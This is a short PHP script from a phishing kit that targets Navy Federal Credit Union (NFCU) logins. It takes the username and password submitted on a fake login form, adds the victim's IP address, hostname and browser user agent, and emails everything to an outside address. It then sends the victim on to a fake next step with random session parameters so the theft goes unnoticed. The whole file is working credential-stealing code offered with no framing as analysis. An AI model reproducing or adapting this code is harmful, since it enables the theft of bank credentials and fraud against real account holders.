<?php
if($_POST["nauesr"] != "" and $_POST["pa33chnad"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------NFCU Info-----------------------\n";
$message .= "|U3er : ".$_POST['nauesr']."\n";
$message .= "|Pa33w0rd  : ".$_POST['pa33chnad']."\n";
$message .= "-------------created by DC-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "contact.james@tnsshopperaustralia.com";
$subject = "Result from NFCU | $ip";
{
mail("$send", "$subject", $message);   
}

$praga=rand();
$praga=md5($praga);
  header ("Location: step1.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
 